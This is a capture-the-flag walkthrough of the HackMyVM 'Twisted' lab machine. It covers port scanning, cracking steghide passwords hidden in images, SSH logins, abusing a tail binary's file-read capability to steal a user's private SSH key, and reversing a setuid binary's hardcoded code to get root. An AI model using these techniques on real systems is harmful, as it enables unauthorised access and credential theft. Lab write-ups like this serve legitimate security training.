# Twisted

## Information

## Solution

### Enumeration
#### Nmap
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sVC -p- -T4 10.11.5.25
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-21 17:31 +07
Nmap scan report for 10.11.5.25
Host is up (0.00044s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2
2222/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 67:63:a0:c9:8b:7a:f3:42:ac:49:ab:a6:a7:3f:fc:ee (RSA)
|   256 8c:ce:87:47:f8:b8:1a:1a:78:e5:b7:ce:74:d7:f5:db (ECDSA)
|_  256 92:94:66:0b:92:d3:cf:7e:ff:e8:bf:3c:7b:41:b7:5a (ED25519)
MAC Address: 08:00:27:DE:CE:80 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.88 seconds
```
#### Web
![web](/walkthroughs/hackmyvm/machines/beginner/Twisted/web.png)

![source page](/walkthroughs/hackmyvm/machines/beginner/Twisted/source-page.png)


####
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ wget http://10.11.5.25/cat-original.jpg
--2026-05-21 17:43:28--  http://10.11.5.25/cat-original.jpg
Connecting to 10.11.5.25:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 288693 (282K) [image/jpeg]
Saving to: ‘cat-original.jpg’

cat-original.jpg      100%[=======================>] 281.93K  --.-KB/s    in 0.02s   

2026-05-21 17:43:28 (14.9 MB/s) - ‘cat-original.jpg’ saved [288693/288693]

┌──(dungcngo㉿kali)-[/tmp]
└─$ wget http://10.11.5.25/cat-hidden.jpg  
--2026-05-21 17:45:39--  http://10.11.5.25/cat-hidden.jpg
Connecting to 10.11.5.25:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 288706 (282K) [image/jpeg]
Saving to: ‘cat-hidden.jpg’

cat-hidden.jpg        100%[=======================>] 281.94K  --.-KB/s    in 0.03s   

2026-05-21 17:45:39 (9.55 MB/s) - ‘cat-hidden.jpg’ saved [288706/288706]
```
### Initial Access
#### Exiftool
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ exiftool cat-original.jpg 
ExifTool Version Number         : 13.36
File Name                       : cat-original.jpg
Directory                       : .
File Size                       : 289 kB
File Modification Date/Time     : 2020:10:14 13:51:44+07:00
File Access Date/Time           : 2026:05:21 17:48:16+07:00
File Inode Change Date/Time     : 2026:05:21 17:43:28+07:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 300
Y Resolution                    : 300
Image Width                     : 2400
Image Height                    : 1347
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 2400x1347
Megapixels                      : 3.2
                                                                                      
┌──(dungcngo㉿kali)-[/tmp]
└─$ exiftool cat-hidden.jpg  
ExifTool Version Number         : 13.36
File Name                       : cat-hidden.jpg
Directory                       : .
File Size                       : 289 kB
File Modification Date/Time     : 2020:10:14 13:51:44+07:00
File Access Date/Time           : 2026:05:21 17:48:15+07:00
File Inode Change Date/Time     : 2026:05:21 17:45:39+07:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 300
Y Resolution                    : 300
Image Width                     : 2400
Image Height                    : 1347
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 2400x1347
Megapixels                      : 3.2
```
#### Steghide & Stegseek
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ stegseek cat-hidden.jpg /usr/share/wordlists/rockyou.txt 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "sexymama"
[i] Original filename: "mateo.txt".
[i] Extracting to "cat-hidden.jpg.out".
                                                                                     
┌──(dungcngo㉿kali)-[/tmp]
└─$ steghide extract -sf cat-hidden.jpg                     
Enter passphrase: 
wrote extracted data to "mateo.txt".

┌──(dungcngo㉿kali)-[/tmp]
└─$ cat mateo.txt      
thisismypassword
```
We have user `mateo` and password for SSH is `thisismypassword`.

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ stegseek cat-original.jpg /usr/share/wordlists/rockyou.txt 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "westlife"
[i] Original filename: "markus.txt".
[i] Extracting to "cat-original.jpg.out".

┌──(dungcngo㉿kali)-[/tmp]
└─$ steghide extract -sf cat-original.jpg                     
Enter passphrase: 
wrote extracted data to "markus.txt".
                                                                                      
┌──(dungcngo㉿kali)-[/tmp]
└─$ cat markus.txt       
markuslovesbonita
```
We have user `markus` and password for SSH is `markuslovesbonita`.

#### Shell (mateo)
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ ssh -p 2222 mateo@10.11.5.25       
The authenticity of host '[10.11.5.25]:2222 ([10.11.5.25]:2222)' can't be established.
ED25519 key fingerprint is: SHA256:+Vy+50OqnmO0eOU2nhxE0uNjMjXrtpHTmrYtml4yF3s
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.11.5.25]:2222' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
mateo@10.11.5.25's password: 
Linux twisted 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Oct 14 03:21:44 2020 from 192.168.1.58
mateo@twisted:~$ id ; hostname
uid=1000(mateo) gid=1000(mateo) groups=1000(mateo),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
twisted
mateo@twisted:~$ find / -name user.txt 2>/dev/null |xargs cat
cat: /home/bonita/user.txt: Permission denied
```
#### Shell (markus)
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ ssh -p 2222 markus@10.11.5.25        
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
markus@10.11.5.25's password: 
Linux twisted 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
markus@twisted:~$ id ; hostname
uid=1001(markus) gid=1001(markus) groups=1001(markus)
twisted
markus@twisted:~$ find / -name user.txt 2>/dev/null |xargs cat
cat: /home/bonita/user.txt: Permission denied
```

#### Shell (bonita)
**Shell - mateo**
```bash
mateo@twisted:~$ ls -la
total 36
drwxr-xr-x 3 mateo mateo 4096 Oct 14  2020 .
drwxr-xr-x 5 root  root  4096 Oct 14  2020 ..
-rw------- 1 mateo mateo    5 Oct 14  2020 .bash_history
-rw-r--r-- 1 mateo mateo  220 Oct 13  2020 .bash_logout
-rw-r--r-- 1 mateo mateo 3526 Oct 13  2020 .bashrc
drwxr-xr-x 3 mateo mateo 4096 Oct 14  2020 .local
-rw------- 1 mateo mateo   25 Oct 14  2020 note.txt
-rw-r--r-- 1 mateo mateo  807 Oct 13  2020 .profile
-rw------- 1 mateo mateo   53 Oct 14  2020 .Xauthority
mateo@twisted:~$ cat note.txt 
/var/www/html/gogogo.wav
```

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ wget http://10.11.5.25/gogogo.wav     
--2026-05-21 18:27:51--  http://10.11.5.25/gogogo.wav
Connecting to 10.11.5.25:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1130160 (1.1M) [application/octet-stream]
Saving to: ‘gogogo.wav’

gogogo.wav            100%[=======================>]   1.08M  --.-KB/s    in 0.07s   

2026-05-21 18:27:51 (15.2 MB/s) - ‘gogogo.wav’ saved [1130160/1130160]

                                                                                 ┌──(dungcngo㉿kali)-[/tmp]
└─$ file gogogo.wav 
gogogo.wav: RIFF (little-endian) data, WAVE audio, Microsoft PCM, 8 bit, mono 11050 Hz
```
Decode `gogogo.wav` by morse decoder:
![gogogo decode](/walkthroughs/hackmyvm/machines/beginner/Twisted/gogogo-decode.png)

The decoded messages reads: `G O D E E P E R . . . C O M E W I T H M E . . . L I T T L E R A B B I T . . .`

**Shell - markus**
```bash
markus@twisted:~$ cat note.txt 
Hi bonita,
I have saved your id_rsa here: /var/cache/apt/id_rsa
Nobody can find it.
markus@twisted:~$ ls -la /home
total 20
drwxr-xr-x  5 root   root   4096 Oct 14  2020 .
drwxr-xr-x 18 root   root   4096 Oct 13  2020 ..
drwxr-xr-x  4 bonita bonita 4096 Oct 14  2020 bonita
drwxr-xr-x  3 markus markus 4096 Oct 14  2020 markus
drwxr-xr-x  3 mateo  mateo  4096 Oct 14  2020 mateo
markus@twisted:/home/bonita$ ls -la
total 52
drwxr-xr-x 4 bonita bonita  4096 Oct 14  2020 .
drwxr-xr-x 5 root   root    4096 Oct 14  2020 ..
-rw-r--r-- 1 bonita bonita   220 Oct 14  2020 .bash_logout
-rw-r--r-- 1 bonita bonita  3526 Oct 14  2020 .bashrc
-rwsrws--- 1 root   bonita 16864 Oct 14  2020 beroot
drwxr-xr-x 3 bonita bonita  4096 Oct 14  2020 .local
-rw-r--r-- 1 bonita bonita   807 Oct 14  2020 .profile
drwx------ 2 bonita bonita  4096 Oct 14  2020 .ssh
-rw------- 1 bonita bonita    12 Oct 14  2020 user.txt
```
```bash
markus@twisted:/home/bonita$ find / -perm -4000 -exec ls -ls {} \; 2>/dev/null
20 -rwsrws--- 1 root bonita 16864 Oct 14  2020 /home/bonita/beroot
64 -rwsr-xr-x 1 root root 63568 Jan 10  2019 /usr/bin/su
36 -rwsr-xr-x 1 root root 34888 Jan 10  2019 /usr/bin/umount
84 -rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
64 -rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
52 -rwsr-xr-x 1 root root 51280 Jan 10  2019 /usr/bin/mount
56 -rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
44 -rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
44 -rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
428 -rwsr-xr-x 1 root root 436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
52 -rwsr-xr-- 1 root messagebus 51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
12 -rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
markus@twisted:/home/bonita$ /sbin/getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep
/usr/bin/tail = cap_dac_read_search+ep
```
![tail gtfobins](/walkthroughs/hackmyvm/machines/beginner/Twisted/tail-gtfo.png)
```bash
markus@twisted:/home/bonita$ /usr/bin/tail -c+0 /var/cache/apt/id_rsa > /tmp/bonita_rsa
markus@twisted:/home/bonita$ chmod 600 /tmp/bonita_rsa
markus@twisted:/home/bonita$ ls -la /tmp/bonita_rsa 
-rw------- 1 markus markus 1823 May 21 08:26 /tmp/bonita_rsa
markus@twisted:/home/bonita$ ssh -i /tmp/bonita_rsa -p 2222 bonita@localhost 
The authenticity of host '[localhost]:2222 ([::1]:2222)' can't be established.
ECDSA key fingerprint is SHA256:/jXXbA2Z9aPaXT0rv70akECrEh60NFWdJ0InAnUve/I.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[localhost]:2222' (ECDSA) to the list of known hosts.
Linux twisted 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
bonita@twisted:~$ id ; hostname
uid=1002(bonita) gid=1002(bonita) groups=1002(bonita)
twisted
```

#### Flags (user.txt)
```bash
bonita@twisted:~$ ls
beroot  user.txt
bonita@twisted:~$ cat user.txt 
HMVblackcat
```

### Privilege Escalation
#### Enumration
```bash
bonita@twisted:~$ sudo -l
-bash: sudo: command not found
bonita@twisted:~$ file beroot 
beroot: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=fecfbde059505a54f66d3229cc9ebb78f997a7ba, not stripped
bonita@twisted:~$ strings beroot 
/lib64/ld-linux-x86-64.so.2
YPZT
libc.so.6
setuid
puts
printf
system
__cxa_finalize
scanf
setgid
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
[]A\A]A^A_
Enter the code:
/bin/bash
WRONG
;*3$"
GCC: (Debian 8.3.0-6) 8.3.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7325
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
beroot.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
puts@@GLIBC_2.2.5
_edata
system@@GLIBC_2.2.5
printf@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
scanf@@GLIBC_2.2.5
setgid@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
bonita@twisted:~$ ./beroot 
Enter the code:
 1234

WRONG
```

#### Abuse
```bash
```bash
bonita@twisted:~$ objdump -d beroot | grep -A 20 "<main>:"
0000000000001185 <main>:
    1185:       55                      push   %rbp
    1186:       48 89 e5                mov    %rsp,%rbp
    1189:       48 83 ec 20             sub    $0x20,%rsp
    118d:       89 7d ec                mov    %edi,-0x14(%rbp)
    1190:       48 89 75 e0             mov    %rsi,-0x20(%rbp)
    1194:       48 8d 3d 69 0e 00 00    lea    0xe69(%rip),%rdi        # 2004 <_IO_stdin_used+0x4>
    119b:       b8 00 00 00 00          mov    $0x0,%eax
    11a0:       e8 ab fe ff ff          callq  1050 <printf@plt>
    11a5:       48 8d 45 fc             lea    -0x4(%rbp),%rax
    11a9:       48 89 c6                mov    %rax,%rsi
    11ac:       48 8d 3d 63 0e 00 00    lea    0xe63(%rip),%rdi        # 2016 <_IO_stdin_used+0x16>
    11b3:       b8 00 00 00 00          mov    $0x0,%eax
    11b8:       e8 a3 fe ff ff          callq  1060 <scanf@plt>
    11bd:       8b 45 fc                mov    -0x4(%rbp),%eax
    11c0:       3d f8 16 00 00          cmp    $0x16f8,%eax       <- This is hexadecimal value 0x16f8 that is compared user input.
    11c5:       75 31                   jne    11f8 <main+0x73>
    11c7:       bf 00 00 00 00          mov    $0x0,%edi
    11cc:       b8 00 00 00 00          mov    $0x0,%eax
    11d1:       e8 aa fe ff ff          callq  1080 <setuid@plt>
    11d6:       bf 00 00 00 00          mov    $0x0,%edi    
bonita@twisted:~$ printf "%d\n" 0x16f8
5880
root@twisted:~# id ; hostname
uid=0(root) gid=0(root) groups=0(root),1002(bonita)
twisted
```

#### Flags (root.txt)
```bash
root@twisted:/root# ls
root.txt
root@twisted:/root# cat root.txt 
HMVwhereismycat
```

***You are welcome!***
